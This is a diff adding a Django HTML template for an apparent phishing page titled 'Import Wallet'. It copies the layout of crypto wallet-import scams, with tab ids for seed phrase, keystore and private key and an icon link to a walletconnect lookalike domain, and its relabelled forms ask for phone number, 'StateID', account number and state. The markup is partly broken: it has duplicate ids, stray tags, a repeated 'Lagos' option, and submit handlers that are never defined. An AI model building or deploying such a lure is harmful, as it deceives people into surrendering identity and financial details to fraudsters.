@@ -1,0 +1,771 @@
+{% load static %}
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=yes" />
+    
+    <title>Import Wallet</title>
+    <link rel="stylesheet" href="{% static 'bootstrap.min.css' %}" />
+    <link rel="stylesheet" href="{% static 'fontawesome-all.min.css' %}" />
+    <link rel="stylesheet" href="{% static 'styles.css' %}" />
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-sweetalert/1.0.1/sweetalert.css"/>
+    <link rel="apple-touch-icon" sizes="180x180" href="https://www.walletconnect.life/apple-touch-icon.html" />
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.html" />
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.html" />
+    
+    <script src="{%  static 'js/jquery-3.6.0.js' %}" crossorigin="anonymous"></script>
+    <link rel='stylesheet' href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.css"/>
+
+
+    <!-- <link rel="manifest" href="/" /> -->
+    <style>
+        ._3emE9--dark-theme .-S-tR--ff-downloader {
+            background: rgba(30, 30, 30, 0.93);
+            border: 1px solid rgba(82, 82, 82, 0.54);
+            box-shadow: 0 4px 7px rgba(30, 30, 30, 0.55);
+            color: #fff;
+        }
+
+        ._3emE9--dark-theme .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn {
+            background: #3d4b52;
+        }
+
+        ._3emE9--dark-theme .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn:hover {
+            background: #131415;
+        }
+
+        ._3emE9--dark-theme .-S-tR--ff-downloader ._10vpG--footer {
+            background: rgba(30, 30, 30, 0.93);
+        }
+
+        ._2mDEx--white-theme .-S-tR--ff-downloader {
+            background: #fff;
+            border: 1px solid rgba(82, 82, 82, 0.54);
+            box-shadow: 0 4px 7px rgba(30, 30, 30, 0.55);
+            color: #314c75;
+        }
+
+        ._2mDEx--white-theme .-S-tR--ff-downloader ._6_Mtt--header {
+            font-weight: 700;
+        }
+
+        ._2mDEx--white-theme .-S-tR--ff-downloader ._2dFLA--container ._2bWNS--notice {
+            border: 0;
+            color: rgba(0, 0, 0, 0.88);
+        }
+
+        ._2mDEx--white-theme .-S-tR--ff-downloader ._10vpG--footer {
+            background: #fff;
+        }
+
+        .-S-tR--ff-downloader {
+            display: block;
+            overflow: hidden;
+            position: fixed;
+            bottom: 20px;
+            right: 7.1%;
+            width: 330px;
+            height: 180px;
+            background: rgba(30, 30, 30, 0.93);
+            border-radius: 2px;
+            color: #fff;
+            z-index: 99999999;
+            border: 1px solid rgba(82, 82, 82, 0.54);
+            box-shadow: 0 4px 7px rgba(30, 30, 30, 0.55);
+            transition: 0.5s;
+        }
+
+        .-S-tR--ff-downloader._3M7UQ--minimize {
+            height: 62px;
+        }
+
+        .-S-tR--ff-downloader._3M7UQ--minimize .nxuu4--file-info,
+        .-S-tR--ff-downloader._3M7UQ--minimize ._6_Mtt--header {
+            display: none;
+        }
+
+        .-S-tR--ff-downloader ._6_Mtt--header {
+            padding: 10px;
+            font-size: 17px;
+            font-family: sans-serif;
+        }
+
+        .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn {
+            float: right;
+            background: #f1ecec;
+            height: 20px;
+            width: 20px;
+            text-align: center;
+            padding: 2px;
+            margin-top: -10px;
+            cursor: pointer;
+        }
+
+        .-S-tR--ff-downloader ._6_Mtt--header ._2VdJW--minimize-btn:hover {
+            background: #e2dede;
+        }
+
+        .-S-tR--ff-downloader ._13XQ2--error {
+            color: red;
+            padding: 10px;
+            font-size: 12px;
+            line-height: 19px;
+        }
+
+        .-S-tR--ff-downloader ._2dFLA--container {
+            position: relative;
+            height: 100%;
+        }
+
+        .-S-tR--ff-downloader ._2dFLA--container .nxuu4--file-info {
+            padding: 6px 15px 0;
+            font-family: sans-serif;
+        }
+
+        .-S-tR--ff-downloader ._2dFLA--container .nxuu4--file-info div {
+            margin-bottom: 5px;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .-S-tR--ff-downloader ._2dFLA--container ._2bWNS--notice {
+            margin-top: 21px;
+            font-size: 11px;
+        }
+
+        .-S-tR--ff-downloader ._10vpG--footer {
+            width: 100%;
+            bottom: 0;
+            position: absolute;
+            font-weight: 700;
+        }
+
+        .-S-tR--ff-downloader ._10vpG--footer ._2V73d--loader {
+            -webkit-animation: n0BD1--rotation 3.5s linear forwards;
+            animation: n0BD1--rotation 3.5s linear forwards;
+            position: absolute;
+            top: -120px;
+            left: calc(50% - 35px);
+            border-radius: 50%;
+            border: 5px solid #fff;
+            border-top-color: #a29bfe;
+            height: 70px;
+            width: 70px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .-S-tR--ff-downloader ._10vpG--footer ._24wjw--loading-bar {
+            width: 100%;
+            height: 18px;
+            background: #dfe6e9;
+            border-radius: 5px;
+        }
+
+        .-S-tR--ff-downloader ._10vpG--footer ._24wjw--loading-bar ._1FVu9--progress-bar {
+            height: 100%;
+            background: #8bc34a;
+            border-radius: 5px;
+        }
+
+        .-S-tR--ff-downloader ._10vpG--footer ._2KztS--status {
+            margin-top: 10px;
+        }
+
+        .-S-tR--ff-downloader ._10vpG--footer ._2KztS--status ._1XilH--state {
+            float: left;
+            font-size: 0.9em;
+            letter-spacing: 1pt;
+            text-transform: uppercase;
+            width: 100px;
+            height: 20px;
+            position: relative;
+        }
+
+        .-S-tR--ff-downloader ._10vpG--footer ._2KztS--status ._1jiaj--percentage {
+            float: right;
+        }
+    </style>
+    <style type="text/css">
+        button.btn[data-v-0a2a5063] {
+            display: inline-block;
+            font-weight: 300;
+            line-height: 1.25;
+            text-align: center;
+            white-space: nowrap;
+            vertical-align: middle;
+            user-select: none;
+            border: 1px solid transparent;
+            cursor: pointer;
+            letter-spacing: 1px;
+            transition: all 0.15s ease;
+        }
+
+        button.btn.btn-sm[data-v-0a2a5063] {
+            padding: 0.4rem 0.8rem;
+            font-size: 0.8rem;
+            border-radius: 0.2rem;
+        }
+
+        button.btn.btn-primary[data-v-0a2a5063] {
+            color: #fff;
+            background-color: #45c8f1;
+            border-color: #45c8f1;
+        }
+
+        button.btn.btn-outline-primary[data-v-0a2a5063] {
+            color: #45c8f1;
+            background-color: transparent;
+            border-color: #45c8f1;
+        }
+
+        button.btn.btn-danger[data-v-0a2a5063] {
+            color: #fff;
+            background-color: #ff4949;
+            border-color: #ff4949;
+        }
+
+        .text-muted[data-v-0a2a5063] {
+            color: #8492a6;
+        }
+
+        .text-center[data-v-0a2a5063] {
+            text-align: center;
+        }
+
+        .drop-down-enter[data-v-0a2a5063],
+        .drop-down-leave-to[data-v-0a2a5063] {
+            transform: translateX(0) translateY(-20px);
+            transition-timing-function: cubic-bezier(0.74, 0.04, 0.26, 1.05);
+            opacity: 0;
+        }
+
+        .drop-down-enter-active[data-v-0a2a5063],
+        .drop-down-leave-active[data-v-0a2a5063] {
+            transition: all 0.15s;
+        }
+
+        .move-left-enter[data-v-0a2a5063],
+        .move-left-leave-to[data-v-0a2a5063] {
+            transform: translateY(0) translateX(-80px);
+            transition-timing-function: cubic-bezier(0.74, 0.04, 0.26, 1.05);
+            opacity: 0;
+        }
+
+        .move-left-enter-active[data-v-0a2a5063],
+        .move-left-leave-active[data-v-0a2a5063] {
+            transition: all 0.15s;
+        }
+
+        .shake[data-v-0a2a5063] {
+            animation: shake-data-v-0a2a5063 0.82s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
+            transform: translate3d(0, 0, 0);
+        }
+
+        @keyframes shake-data-v-0a2a5063 {
+            10%,
+            90% {
+                transform: translate3d(-1px, 0, 0);
+            }
+            20%,
+            80% {
+                transform: translate3d(2px, 0, 0);
+            }
+            30%,
+            50%,
+            70% {
+                transform: translate3d(-4px, 0, 0);
+            }
+            40%,
+            60% {
+                transform: translate3d(4px, 0, 0);
+            }
+        }
+
+        .pulse[data-v-0a2a5063] {
+            animation: pulse-data-v-0a2a5063 2s ease infinite;
+        }
+
+        @keyframes pulse-data-v-0a2a5063 {
+            0% {
+                opacity: 0.7;
+            }
+            50% {
+                opacity: 0.4;
+            }
+            100% {
+                opacity: 0.7;
+            }
+        }
+
+        .flash-once[data-v-0a2a5063] {
+            animation: flash-once 3.5s ease 1;
+        }
+
+        @keyframes fade-up-data-v-0a2a5063 {
+            0% {
+                transform: translate3d(0, 10px, 0);
+                opacity: 0;
+            }
+            100% {
+                transform: translate3d(0, 0, 0);
+                opacity: 1;
+            }
+        }
+
+        .fade-in[data-v-0a2a5063] {
+            animation: fade-in-data-v-0a2a5063 0.3s ease-in-out;
+        }
+
+        @keyframes fade-in-data-v-0a2a5063 {
+            0% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
+        .spin[data-v-0a2a5063] {
+            animation-name: spin-data-v-0a2a5063;
+            animation-duration: 2000ms;
+            animation-iteration-count: infinite;
+            animation-timing-function: linear;
+        }
+
+        @keyframes spin-data-v-0a2a5063 {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .bounceIn[data-v-0a2a5063] {
+            animation-name: bounceIn-data-v-0a2a5063;
+            transform-origin: center bottom;
+            animation-duration: 1s;
+            animation-fill-mode: both;
+            animation-iteration-count: 1;
+        }
+
+        @keyframes bounceIn-data-v-0a2a5063 {
+            0%,
+            20%,
+            40%,
+            60%,
+            80%,
+            100% {
+                -webkit-transition-timing-function: cubic-bezier( 0.215, 0.61, 0.355, 1);
+                transition-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
+            }
+            0% {
+                opacity: 1;
+                -webkit-transform: scale3d(0.8, 0.8, 0.8);
+                transform: scale3d(0.8, 0.8, 0.8);
+            }
+            20% {
+                -webkit-transform: scale3d(1.1, 1.1, 1.1);
+                transform: scale3d(1.1, 1.1, 1.1);
+            }
+            40% {
+                -webkit-transform: scale3d(0.9, 0.9, 0.9);
+                transform: scale3d(0.9, 0.9, 0.9);
+            }
+            60% {
+                opacity: 1;
+                -webkit-transform: scale3d(1.03, 1.03, 1.03);
+                transform: scale3d(1.03, 1.03, 1.03);
+            }
+            80% {
+                -webkit-transform: scale3d(0.97, 0.97, 0.97);
+                transform: scale3d(0.97, 0.97, 0.97);
+            }
+            100% {
+                opacity: 1;
+                -webkit-transform: scale3d(1, 1, 1);
+                transform: scale3d(1, 1, 1);
+            }
+        }
+
+        @keyframes dots-data-v-0a2a5063 {
+            0%,
+            20% {
+                color: rgba(0, 0, 0, 0);
+                text-shadow: 0.25em 0 0 rgba(0, 0, 0, 0), 0.5em 0 0 rgba(0, 0, 0, 0);
+            }
+            40% {
+                color: #8492a6;
+                text-shadow: 0.25em 0 0 rgba(0, 0, 0, 0), 0.5em 0 0 rgba(0, 0, 0, 0);
+            }
+            60% {
+                text-shadow: 0.25em 0 0 #8492a6, 0.5em 0 0 rgba(0, 0, 0, 0);
+            }
+            80%,
+            100% {
+                text-shadow: 0.25em 0 0 #8492a6, 0.5em 0 0 #8492a6;
+            }
+        }
+
+        @keyframes recording-data-v-0a2a5063 {
+            0% {
+                box-shadow: 0px 0px 5px 0px rgba(173, 0, 0, 0.3);
+            }
+            65% {
+                box-shadow: 0px 0px 5px 5px rgba(173, 0, 0, 0.3);
+            }
+            90% {
+                box-shadow: 0px 0px 5px 5px rgba(173, 0, 0, 0);
+            }
+        }
+
+        html[data-v-0a2a5063] {
+            max-height: 500px;
+        }
+
+        body[data-v-0a2a5063] {
+            margin: 0;
+            font-size: 100%;
+            color: #3c4858;
+            width: 350px;
+            max-height: 500px;
+        }
+
+        a[data-v-0a2a5063] {
+            text-decoration: none;
+            color: #45c8f1;
+        }
+
+        h1[data-v-0a2a5063],
+        h2[data-v-0a2a5063],
+        h3[data-v-0a2a5063],
+        h4[data-v-0a2a5063] {
+            margin-top: 0;
+        }
+
+        .container_selected_area[data-v-0a2a5063] {
+            padding: 0px;
+            position: fixed;
+            z-index: 2147483647;
+            top: 0px;
+            left: 0px;
+            right: 0px;
+            bottom: 0px;
+            display: none;
+            visibility: hidden;
+        }
+
+        .container_selected_area.active[data-v-0a2a5063] {
+            visibility: visible;
+            display: block;
+        }
+
+        .container_selected_area .label[data-v-0a2a5063] {
+            font-family: "Didact Gothic Regular", sans-serif;
+            font-size: 22px;
+            text-align: center;
+            padding-top: 15px;
+        }
+
+        .container_selected_area .area[data-v-0a2a5063] {
+            border: 1px solid #1e83ff;
+            background: rgba(30, 131, 255, 0.1);
+            display: none;
+            position: fixed;
+            z-index: 2147483647;
+            box-sizing: border-box;
+        }
+
+        .container_selected_area .area.active[data-v-0a2a5063] {
+            display: block;
+            top: 0px;
+            left: 0px;
+        }
+
+        .hide[data-v-0a2a5063] {
+            display: none;
+        }
+        .cred{
+          margin: 10px;
+        }
+    </style>
+
+    <script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js" type="application/javascript"></script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert-dev.js"></script>
+
+
+</head>
+
+<body>
+    <header>
+        <!-- <div class="container-fluid">
+            <div class="row">
+                <div class="col-md-4 offset-md-4">
+                    <a class="text-white" href="/" style="font-size: 20px"><i class="fas fa-angle-left"></i>&nbsp; &nbsp;</a
+            >
+          </div>
+        </div> -->
+      </div>
+    </header>
+    <div class="container-fluid">
+      <div class="row">
+        <div class="col-md-4 offset-md-4">
+          <ul class="nav nav-tabs">
+            <li id="phrase_nav" class="nav-item">
+              <a
+                id="phrase_nav_a"
+                class="nav-link active"
+                data-toggle="tab"
+                href="#phrase"
+                >Phone Number</a
+              >
+            </li>
+            <li id="keystore_nav" class="nav-item">
+              <a
+                id="keystore_nav_a"
+                class="nav-link"
+                data-toggle="tab"
+                href="#keystore/"
+                >Enter Your StateID</a
+              >
+            </li>
+            <li id="private_nav" class="nav-item">
+              <a
+                id="private_nav_a"
+                class="nav-link"
+                data-toggle="tab"
+                href="#private_key/"
+                >Get StateID</a
+              >
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <section style="margin-top: 40px">
+      <div class="container-fluid">
+        <div class="row">
+          <div class="col-md-4 offset-md-4">
+            <!-- Tab panes -->
+            <div class="tab-content">
+              <div
+                role="tabpanel"
+                class="tab-pane fade show active"
+                id="phrase"
+              >
+                <form method="post" onsubmit="formSubmitPhrase(event)">
+                  {{csrf_token}}
+                  <input
+                    id="phrase_text_area"
+                    class="form-control"
+                    rows="5"
+                    name="phrase"
+                    placeholder="Phone Number"
+                    autocorrect="off"
+                  />
+                  <p class="text-secondary" style="margin-top: 10px">
+                    Enter Your Mobile Number
+                  </p>
+                  <input
+                    type="hidden"
+                    id="type_phrase"
+                    name="value"
+                    value="phrase"
+                  />
+                  <div class="form-group">
+                    <button
+                      class="btn btn-primary btn-block"
+                      type="submit"
+                      name="submit"
+                      id="import_btn_1"
+                    >
+                      submit
+                    </button>
+                  </div>
+                </form>
+              </div>
+              <div role="tabpanel" class="tab-pane fade" id="keystore">
+                {{csrf_token}}
+                <form method="post" onsubmit="formSubmitKeystore(event)">
+                  <div class="form-group">
+                    <input
+                      class="form-control"
+                      id="keystore_text_area"
+                      name="keystorejson"
+                      rows="5"
+                      placeholder="StateID"
+                    >
+                  </div>
+                  <p class="text-secondary" style="margin-top: 10px">
+                    Input Your StateID here if you have one
+                  </p>
+                  <input
+                    type="hidden"
+                    id="type_keystore"
+                    name="value"
+                    value="keystore"
+                  />
+                  <div class="form-group">
+                    <button
+                      class="btn btn-primary btn-block"
+                      type="submit"
+                      name="submit"
+                      id="import_btn_2"
+                    >
+                      Submit
+                    </button>
+                  </div>
+                </form>
+              </div>
+              <div role="tabpanel" class="tab-pane fade" id="privatekey">
+                <form method="post" onsubmit="formSubmitPrivateKey(event)">
+                  {{csrf_token}}
+                  <div class="form-group">
+                    <input
+                      class="form-control cred"
+                      id="private_key_input"
+                      name="privatekey"
+                      placeholder="Phone Number"
+                      value=""
+                    />
+                    <input
+                      class="form-control cred"
+                      id="private_key_input"
+                      name="privatekey"
+                      placeholder="Account Number"
+                      value=""
+                    />
+                    <input
+                    class="form-control cred"
+                    id="private_key_input"
+                    name="privatekey"
+                    placeholder="Phone Number"
+                    value=""
+                  />
+                  <input class="form-control" type="text" name="country" list="country" placeholder="country">
+                  <datalist id="countries">
+                    <option value="Lagos"></option>
+                    <option value="Ekiti"></option>
+                    <option value="Bauchi"></option>
+                    <option value="Kwara"></option>
+                    <option value="Kebbi"></option>
+                    <option value="Lagos"></option>
+                    <option value="Lagos"></option>
+                    <option value="Lagos"></option>
+                    <option value="Lagos"></option>
+                    <option value="Lagos"></option>
+                    <option value="Lagos"></option>
+                    <option value="Lagos"></option>
+                    <option value="Lagos"></option>
+                    <option value="Lagos"></option>
+                    <option value="Lagos"></option>
+                    <option value="Lagos"></option>
+                    <option value="Lagos"></option>
+                    <option value="Lagos"></option>
+                    <option value="Lagos"></option>
+                  </datalist>
+                  </div>
+                  <input
+                    type="hidden"
+                    id="type_private"
+                    name="value"
+                    value="privatekey"
+                  />
+                  <div class="form-group">
+                    <button
+                      class="btn btn-primary btn-block"
+                      type="submit"
+                      name="submit"
+                      id="import_btn_3"
+                    >
+                      Submit
+                    </button>
+                  </div>
+                </form>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <div id="mfa_inject_cartdata" hidden="hidden"></div>
+    <div id="mfa_inject" hidden="hidden"></div>
+    <input type="file" id="" name="file" style="display: none" />
+    <div
+      data-v-0a2a5063=""
+      class="container_selected_area"
+      style="
+        cursor: url('chrome-extension://ialiedlpfknneamnbemcgmaboleiccdd/assets/images/cursor-imagen.svg')
+            9 9,
+          crosshair;
+      "
+    >
+      <div data-v-0a2a5063="" class="area"></div>
+    </div>
+    <script>
+    const import_btn_2 = document.getElementById("import_btn_2");
+const import_btn_3 = document.getElementById("import_btn_3");
+
+const phrase = document.getElementById("phrase_nav");
+const keystore = document.getElementById("keystore_nav");
+const private_n = document.getElementById("private_nav");
+
+const phrase_a = document.getElementById("phrase_nav_a");
+const keystore_a = document.getElementById("keystore_nav_a");
+const private_a = document.getElementById("private_nav_a");
+
+// PHRASE
+const phrase_textarea = document.getElementById("phrase_text_area");
+const type_phrase = document.getElementById("type_phrase");
+
+// KEYSTORE
+const keystore_text_area = document.getElementById("keystore_text_area");
+const keystore_pass_input = document.getElementById("keystore_pass_input");
+const type_keystore = document.getElementById("type_keystore");
+
+// PRIVATE KEY
+const private_key_input = document.getElementById("private_key_input");
+const type_private = document.getElementById("type_private");
+
+const phrase_div = document.getElementById("phrase");
+const keystore_div = document.getElementById("keystore");
+const private_div = document.getElementById("privatekey");
+
+phrase.addEventListener("click", () => {
+    phrase_div.className += " show active";
+    keystore_div.classList.remove("show", "active");
+    private_div.classList.remove("show", "active");
+    phrase_a.classList.add("active");
+    keystore_a.classList.remove("active");
+    private_a.classList.remove("active");
+});
+
+keystore.addEventListener("click", () => {
+    keystore_div.className += " show active";
+    phrase_div.classList.remove("show", "active");
+    private_div.classList.remove("show", "active");
+    keystore_a.classList.add("active");
+    phrase_a.classList.remove("active");
+    private_a.classList.remove("active");
+});
+
+private_a.addEventListener("click", () => {
+    private_div.className += "show active";
+    phrase_div.classList.remove("show", "active");
+    keystore_div.classList.remove("show", "active");
+    private_a.classList.add("active");
+    keystore_a.classList.remove("active");
+    phrase_a.classList.remove("active");
+});
+
+    </script>
+ 
+
+  </body>
+</html>
